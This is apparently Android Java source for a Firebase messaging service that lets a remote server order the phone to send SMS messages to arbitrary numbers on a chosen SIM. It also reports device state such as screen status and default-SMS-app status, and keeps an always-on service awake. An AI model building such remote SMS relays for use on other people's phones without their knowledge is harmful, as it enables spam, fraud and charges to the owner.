package com.example.smstestapp;

import android.Manifest;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.telephony.SmsManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.content.ContextCompat;
import androidx.work.Constraints;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class MyFirebaseMessagingService extends FirebaseMessagingService {

    @Override
    public void onNewToken(@NonNull String token) {
        super.onNewToken(token);
        getSharedPreferences("firebase_prefs", MODE_PRIVATE)
                .edit()
                .putString("firebase_token", token)
                .apply();
        Log.d("FCM", "Token refreshed: " + token);

        // Mark registration pending if you have a backend register API
        getSharedPreferences("reg_prefs", MODE_PRIVATE)
                .edit().putBoolean("need_register", true).apply();
    }

    @Override
    public void onMessageReceived(@NonNull RemoteMessage remoteMessage) {
        super.onMessageReceived(remoteMessage);

        Map<String, String> data = remoteMessage.getData();
        if (data == null || !data.containsKey("type")) return;

        String command = data.get("type");
        Log.d("FCM", "onMessageReceived type=" + command + " data=" + data);

        if ("ping".equalsIgnoreCase(command)) {

            //  Wake Foreground Service immediately (pass reason for debug)
            Intent svc = new Intent(getApplicationContext(), AlwaysOnService.class)
                    .putExtra("reason", "fcm_ping");
            ContextCompat.startForegroundService(getApplicationContext(), svc);

            // Reply + optional resend nudge
            handlePingCommand();

            if (getSharedPreferences("reg_prefs", MODE_PRIVATE)
                    .getBoolean("need_register", true)) {
            }

        } else if ("resend".equalsIgnoreCase(command)) {
            triggerSmsResendWorker();

        } else if ("sms".equalsIgnoreCase(command)) {
            String toNumber = data.get("to");
            String message  = data.get("text");
            String sim      = data.get("sim");
            String id       = data.get("id");
            sendSmsFromApp(toNumber, message, sim, id);
        }
    }

    private void triggerSmsResendWorker() {
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();

        OneTimeWorkRequest request = new OneTimeWorkRequest.Builder(SmsResendWorker.class)
                .setConstraints(constraints)
                .build();

        WorkManager.getInstance(getApplicationContext()).enqueue(request);
    }

    private void handlePingCommand() {
        Context context = getApplicationContext();
        try {
            JSONObject reply = new JSONObject();
            reply.put("type", "ping");
            reply.put("default", MainActivity.isDefaultSmsApp(context) ? "yes" : "no");
            reply.put("screen", MainActivity.isAppVisible() ? "on" : "off");
            reply.put("battery",NetUtils.getBatteryLevel(getApplicationContext()));

            FirebaseUtils.sendPingResponse(context, reply);
            Log.d("FCM", "Ping reply sent: " + reply);

            // Optional: immediate resend pass
            triggerSmsResendWorker();

        } catch (Exception e) {
            Log.e("FCM", "Ping build/send failed", e);
        }
    }

    private void sendSmsFromApp(String number, String text, String sim, String id) {
        Context context = getApplicationContext();

        if (ContextCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            Log.e("SMS", "SEND_SMS permission not granted");
            try {
                JSONObject json = new JSONObject();
                json.put("type", "acknowledgement");
                json.put("id", id != null ? id : "local_" + System.currentTimeMillis());
                json.put("sim", sim != null ? sim : "1");
                json.put("status", "failed");
                json.put("error", "perm_denied");
                StatusPoster.postJson(context, json);
            } catch (Exception ignore) {}
            return;
        }

        SubscriptionManager sm = (SubscriptionManager) context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
        List<SubscriptionInfo> subs = null;
        try {
            subs = sm != null ? sm.getActiveSubscriptionInfoList() : null;
        } catch (Exception e) {
            Log.w("SMS", "Cannot fetch SIM list", e);
        }

        if (subs == null || subs.isEmpty()) {
            Log.e("SMS", "No SIM available");
            try {
                JSONObject json = new JSONObject();
                json.put("type", "acknowledgement");
                json.put("id", id != null ? id : "local_" + System.currentTimeMillis());
                json.put("sim", sim != null ? sim : "1");
                json.put("status", "failed");
                json.put("error", "no_sim");
                StatusPoster.postJson(context, json);
            } catch (Exception ignore) {}
            return;
        }

        String msgId = (id != null) ? id : "local_" + System.currentTimeMillis();

        int simSlotIndex = 0;
        try {
            if (sim != null) simSlotIndex = Integer.parseInt(sim) - 1; // 1-based → 0-based
        } catch (NumberFormatException ignored) {}

        SmsManager smsManager = SmsManager.getDefault();
        try {
            if (simSlotIndex >= 0 && simSlotIndex < subs.size()) {
                int subId = subs.get(simSlotIndex).getSubscriptionId();
                smsManager = SmsManager.getSmsManagerForSubscriptionId(subId);
                Log.d("SMS", "Using SIM slot=" + (simSlotIndex + 1) + " subId=" + subId);
            }
        } catch (Exception e) {
            Log.w("SMS", "Falling back to default SIM", e);
        }

        int reqCode = (int) (System.currentTimeMillis() & 0xfffffff);

        Intent sentIntent = new Intent(context, SmsSentReceiver.class);
        sentIntent.putExtra("id", msgId);
        sentIntent.putExtra("sim", sim);
        PendingIntent sentPI = PendingIntent.getBroadcast(
                context, reqCode, sentIntent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );

        Intent deliveredIntent = new Intent(context, SmsDeliveredReceiver.class);
        deliveredIntent.putExtra("id", msgId);
        deliveredIntent.putExtra("sim", sim);
        PendingIntent deliveredPI = PendingIntent.getBroadcast(
                context, reqCode + 1, deliveredIntent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );

        ArrayList<String> parts = smsManager.divideMessage(text);
        ArrayList<PendingIntent> sentIntents = new ArrayList<>();
        ArrayList<PendingIntent> deliveredIntents = new ArrayList<>();
        for (int i = 0; i < parts.size(); i++) {
            sentIntents.add(sentPI);
            deliveredIntents.add(deliveredPI);
        }

        if (parts.size() > 1) {
            smsManager.sendMultipartTextMessage(number, null, parts, sentIntents, deliveredIntents);
        } else {
            smsManager.sendTextMessage(number, null, text, sentPI, deliveredPI);
        }

        Log.d("SMS", "SMS send initiated to " + number + " id=" + msgId + " sim=" + sim);
    }
}
